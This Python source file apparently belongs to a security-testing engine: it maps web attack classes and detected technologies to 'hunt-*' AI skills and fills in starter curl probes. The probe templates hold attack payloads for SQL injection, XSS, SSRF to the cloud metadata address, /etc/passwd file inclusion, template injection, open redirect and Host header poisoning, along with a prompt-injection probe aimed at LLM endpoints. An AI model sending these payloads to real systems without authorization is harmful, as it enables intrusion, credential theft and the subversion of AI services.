#!/usr/bin/env python3
"""
skill_map.py — categorize the discovered attack surface against the hunt-* skill arsenal.

The engine's job is NOT to test everything itself. It maps the surface, then tells the
operator *which skill applies where* and *the first curl to run* — so the human spends
their 20% expert effort where the 80% automation points:

    surface (endpoint / parameter)  ->  attack class  ->  which hunt-* skill  ->  first curl

Mappings are grounded in the skills actually installed (~/.claude/skills); anything not
present is filtered out so we never point at a skill that isn't there.
Active testing is curl-first; Burp MCP is optional (only where noted — OOB/blind/fuzzing).
"""
import os

SKILLS_DIR = os.path.expanduser("~/.claude/skills")

# attack class -> hunt skill(s) in the bundle
CLASS_SKILL = {
    "sqli": ["hunt-sqli"], "nosqli": ["hunt-nosqli"], "xss": ["hunt-xss", "hunt-dom"],
    "ssrf": ["hunt-ssrf"], "idor": ["hunt-idor"], "open-redirect": ["hunt-open-redirect"],
    "lfi": ["hunt-lfi"], "ssti": ["hunt-ssti"], "rce": ["hunt-rce"], "xxe": ["hunt-xxe"],
    "auth-bypass": ["hunt-auth-bypass", "hunt-session"], "llm-ai": ["hunt-llm-ai"],
    "saml": ["hunt-saml"], "oauth": ["hunt-oauth"], "mfa": ["hunt-mfa-bypass"],
    "graphql": ["hunt-graphql"], "csrf": ["hunt-csrf"], "cors": ["hunt-cors"],
    "info-leak": ["hunt-source-leak", "hunt-api-misconfig"], "secret": ["hunt-source-leak"],
    "deserialization": ["hunt-deserialization"], "file-upload": ["hunt-file-upload"],
    "host-header": ["hunt-host-header"], "http-smuggling": ["hunt-http-smuggling"],
    "race-condition": ["hunt-race-condition"], "business-logic": ["hunt-business-logic"],
}

# detected tech -> tech-specific skill(s)
TECH_SKILL = {
    "next.js": ["hunt-nextjs"], "node.js": ["hunt-nodejs"], "react": ["hunt-dom"],
    "wordpress": ["hunt-sqli", "hunt-idor"], "laravel": ["hunt-laravel"], "spring": ["hunt-springboot"],
    "asp.net": ["hunt-aspnet"], "sharepoint": ["hunt-sharepoint"], "graphql": ["hunt-graphql"],
    "grpc": ["hunt-grpc"],
}

# curl-first starter probe per class. {u}=url with FUZZ->1, {ur}=injection prefix (before the value)
CLASS_PROBE = {
    "sqli": "curl -s \"{u}\"   # then  ' OR '1'='1'--  and time-based  ' AND SLEEP(5)--  (Burp Intruder for blind)",
    "nosqli": "curl -s \"{u}\"   # then  [$ne]=1 / {\"$gt\":\"\"}  in the param",
    "xss": "curl -s \"{ur}z1z<svg/onload=alert(1)>\"   # check the marker comes back UNencoded",
    "open-redirect": "curl -sI \"{ur}https://evil.example\"   # inspect the Location: response header",
    "ssrf": "curl -s \"{ur}http://169.254.169.254/latest/meta-data/\"   # Burp Collaborator for blind OOB",
    "idor": "curl -s \"{u}\"   # swap/increment the id across two identities; diff the bodies",
    "lfi": "curl -s \"{ur}../../../../etc/passwd\"   # also php://filter/convert.base64-encode/resource=",
    "ssti": "curl -s \"{ur}{{7*7}}\"   # look for 49 (or ${7*7}); confirm engine before RCE",
    "rce": "curl -s \"{u}\"   # only with explicit authorization; start with benign id;sleep markers",
    "xxe": "curl -s -X POST \"{u}\" -d '<?xml ...>'   # OOB via Collaborator if blind",
    "auth-bypass": "curl -s \"{u}\"   # no token / expired token / role swap / forced browse",
    "llm-ai": "curl -s -X POST \"{u}\" -H 'Content-Type: application/json' -d '{\"messages\":[{\"role\":\"user\",\"content\":\"...\"}]}'   # prompt-injection / system-prompt extraction",
    "graphql": "curl -s -X POST \"{u}\" -d '{\"query\":\"{__schema{types{name}}}\"}'   # introspection",
    "csrf": "curl -s \"{u}\"   # check for SameSite / CSRF token on state-changing POST",
    "info-leak": "curl -s \"{u}\"   # inspect for secrets / verbose errors / source / stack traces",
    "secret": "curl -s \"{u}\"   # confirm the exposed secret is present (read-only — do NOT exercise it)",
    "host-header": "curl -s \"{u}\" -H 'Host: evil.example'   # check for reflection / cache / pw-reset poisoning",
    "saml": "curl -s \"{u}\"   # inspect SAML/SSO config endpoints; test XSW / signature-stripping / IdP confusion (needs auth)",
    "oauth": "curl -s \"{u}\"   # check redirect_uri validation, state, PKCE, token leakage",
}


def _present():
    try:
        return set(os.listdir(SKILLS_DIR))
    except Exception:
        return set()


def _filter(names):
    present = _present()
    return [s for s in names if not present or s in present]


def skills_for(vuln_class, tech=None):
    """Class-specific skill(s) for a vuln class (tech kept separate — see tech_skills)."""
    out = _filter(CLASS_SKILL.get(vuln_class, []))
    return out or _filter(["hunt-misc"])


def tech_skills(tech):
    """Tech-stack skill(s) for the detected service tech (target-wide, not per class)."""
    out = []
    for t in (tech or []):
        for s in _filter(TECH_SKILL.get((t or "").lower(), [])):
            if s not in out:
                out.append(s)
    return out


def probe_for(vuln_class, url, param=None):
    """Curl-first starter probe string for a (class, url)."""
    tmpl = CLASS_PROBE.get(vuln_class, "curl -s \"{u}\"")
    u = url.replace("FUZZ", "1")
    if "FUZZ" in url:
        ur = url.split("FUZZ", 1)[0]
    elif param:
        ur = url + ("&" if "?" in url else "?") + param + "="
    else:
        ur = url + ("&" if "?" in url else "?") + "x="
    return tmpl.replace("{u}", u).replace("{ur}", ur)


if __name__ == "__main__":
    miss = [s for skills in list(CLASS_SKILL.values()) + list(TECH_SKILL.values())
            for s in skills if _present() and s not in _present()]
    print(f"skill_map: {len(CLASS_SKILL)} class mappings, {len(TECH_SKILL)} tech mappings")
    print(f"  skills referenced but NOT installed: {sorted(set(miss)) or 'none'}")
    for c in ("sqli", "open-redirect", "llm-ai", "idor"):
        print(f"  {c:14s} -> {skills_for(c, ['Next.js'])}  ::  {probe_for(c, 'https://t/?p=FUZZ', 'p')}")
